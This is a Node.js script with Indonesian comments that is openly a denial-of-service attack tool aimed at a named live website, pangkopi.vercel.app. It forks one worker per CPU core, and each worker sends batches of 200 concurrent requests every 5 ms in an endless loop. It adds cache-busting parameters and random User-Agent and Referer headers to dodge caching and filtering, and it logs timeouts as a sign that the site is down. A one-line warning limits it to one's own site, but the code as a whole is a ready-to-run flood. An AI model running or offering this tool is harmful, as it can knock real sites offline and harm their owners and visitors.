const axios = require('axios');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

// URL target - ganti dengan URL website React Anda
const TARGET_URL = 'https://pangkopi.vercel.app';
// Jumlah maksimum request paralel per worker - Ditingkatkan signifikan
const MAX_CONCURRENT_REQUESTS = 200;
// Interval antar request (dalam ms) - Dikurangi untuk serangan lebih cepat
const REQUEST_INTERVAL = 5;

// Log file
const LOG_FILE = 'dos_attack_log.txt';

// Endpoints untuk diserang (lebih fokus ke endpoint yang ada di target)
const targetEndpoints = [
  '/',
  '/our-story',
  '/shop',
  '/contact',
  // Tambahkan parameter query untuk meningkatkan beban server
  '/?random=' + Math.random(),
  '/our-story?nocache=' + Date.now(),
  '/shop?products=all&sort=price&nocache=' + Date.now(),
  '/contact?form=support&nocache=' + Date.now()
];

// Fungsi untuk membuat timestamp
function getTimestamp() {
  return new Date().toISOString();
}

// Fungsi untuk log ke file
function logToFile(message) {
  fs.appendFileSync(LOG_FILE, `${getTimestamp()} - ${message}\n`);
}

// Fungsi untuk melakukan serangan dari single worker
async function attackFromWorker(workerId) {
  console.log(`Worker ${workerId} memulai serangan...`);
  logToFile(`Worker ${workerId} memulai serangan`);

  let requestCount = 0;
  let successCount = 0;
  let failCount = 0;
  
  // Fungsi untuk mengirim satu request
  async function sendRequest() {
    // Pilih endpoint secara acak
    const randomEndpoint = targetEndpoints[Math.floor(Math.random() * targetEndpoints.length)];
    // Tambahkan timestamp atau random query untuk menghindari caching
    const cacheBuster = Date.now();
    const targetUrl = `${TARGET_URL}${randomEndpoint}${randomEndpoint.includes('?') ? '&' : '?'}cb=${cacheBuster}`;
    
    try {
      requestCount++;
      const start = Date.now();
      
      // Mengirim request GET ke target dengan headers yang bervariasi
      const response = await axios.get(targetUrl, {
        timeout: 5000, // timeout dikurangi menjadi 5 detik
        headers: {
          'User-Agent': getRandomUserAgent(),
          'Referer': getRandomReferer(),
          'Accept': 'text/html,application/json,application/xhtml+xml',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'X-Requested-With': 'XMLHttpRequest',
          'X-Request-ID': `worker-${workerId}-req-${requestCount}-${Date.now()}`
        }
      });
      
      const responseTime = Date.now() - start;
      successCount++;
      
      // Log response time untuk analisis
      if (requestCount % 100 === 0) {
        console.log(`Worker ${workerId} - Request #${requestCount} ke ${targetUrl} - Status: ${response.status} - Response time: ${responseTime}ms`);
        logToFile(`Worker ${workerId} - Request #${requestCount} - Status: ${response.status} - Response time: ${responseTime}ms`);
      }
      
      // Jika waktu respons lebih dari 1 detik, catat sebagai potensi keberhasilan overload
      if (responseTime > 1000) {
        console.log(`\x1b[33m%s\x1b[0m`, `Worker ${workerId} - Potensi overload terdeteksi! Response time: ${responseTime}ms`);
        logToFile(`OVERLOAD DETECTED - Response time: ${responseTime}ms - URL: ${targetUrl}`);
      }
      
      // Jika waktu respons lebih dari 3 detik, catat sebagai overload signifikan
      if (responseTime > 3000) {
        console.log(`\x1b[31m%s\x1b[0m`, `Worker ${workerId} - SIGNIFICANT OVERLOAD! Response time: ${responseTime}ms`);
        logToFile(`SIGNIFICANT OVERLOAD - Response time: ${responseTime}ms - URL: ${targetUrl}`);
      }
      
    } catch (error) {
      failCount++;
      
      if (error.response) {
        // Server merespon dengan status error
        console.log(`Worker ${workerId} - Request #${requestCount} GAGAL - Status: ${error.response.status}`);
        logToFile(`Worker ${workerId} - Request #${requestCount} GAGAL - Status: ${error.response.status}`);
      } else if (error.request) {
        // Server tidak merespon (timeout) - ini menunjukkan potential DoS success
        console.log(`\x1b[31m%s\x1b[0m`, `Worker ${workerId} - Request #${requestCount} TIMEOUT - Server mungkin down!`);
        logToFile(`SERVER DOWN/TIMEOUT - Worker ${workerId} - Request #${requestCount}`);
      } else {
        // Error lainnya
        console.log(`Worker ${workerId} - Request #${requestCount} ERROR: ${error.message}`);
        logToFile(`Worker ${workerId} - Error: ${error.message}`);
      }
    }
  }
  
  // Menjalankan multiple request secara paralel tanpa batas waktu
  while (true) {
    const promises = [];
    for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
      promises.push(sendRequest());
    }
    
    await Promise.all(promises);
    
    // Menunggu interval sebelum batch request berikutnya
    await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL));
  }
}

// Helper functions untuk mengacak headers
function getRandomUserAgent() {
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getRandomReferer() {
  const referers = [
    'https://www.google.com/search?q=coffee+shop',
    'https://www.bing.com/search?q=best+coffee+in+town',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.instagram.com/',
    'https://www.reddit.com/r/coffee'
  ];
  return referers[Math.floor(Math.random() * referers.length)];
}

// Inisialisasi file log
if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, `=== LOG SERANGAN DOS - ${getTimestamp()} ===\n\n`);
}

// Fungsi utama
if (cluster.isPrimary) {
  console.log(`\x1b[31m%s\x1b[0m`, `
██████╗  ██████╗ ███████╗    ███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██╔════╝    ██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ██║██║   ██║███████╗    ███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
██║  ██║██║   ██║╚════██║    ╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
██████╔╝╚██████╔╝███████║    ███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═════╝  ╚═════╝ ╚══════╝    ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
`);
  console.log(`Memulai simulasi serangan DoS pada ${TARGET_URL}`);
  console.log(`PERINGATAN: Alat ini hanya untuk tujuan pengujian dan edukasi pada website milik sendiri!`);
  console.log(`Tekan Ctrl+C untuk menghentikan serangan`);
  
  logToFile(`Target: ${TARGET_URL}`);
  logToFile(`Concurrent requests per worker: ${MAX_CONCURRENT_REQUESTS}`);
  
  // Menentukan jumlah CPU cores untuk worker - Gunakan semua CPU yang tersedia
  const numCPUs = os.cpus().length;
  // Gunakan semua core yang tersedia untuk serangan lebih intensif
  const numWorkers = numCPUs;
  
  console.log(`Menggunakan ${numWorkers} workers untuk serangan...`);
  logToFile(`Menggunakan ${numWorkers} workers`);
  
  // Fork workers
  for (let i = 0; i < numWorkers; i++) {
    const worker = cluster.fork();
    worker.on('exit', (code, signal) => {
      if (signal) {
        console.log(`Worker ${worker.id} dibunuh oleh sinyal: ${signal}`);
      } else if (code !== 0) {
        console.log(`Worker ${worker.id} keluar dengan code: ${code}`);
      }
    });
  }
  
  // Handle worker exit
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.id} selesai`);
  });
  
} else {
  // Kode worker
  attackFromWorker(cluster.worker.id);
} 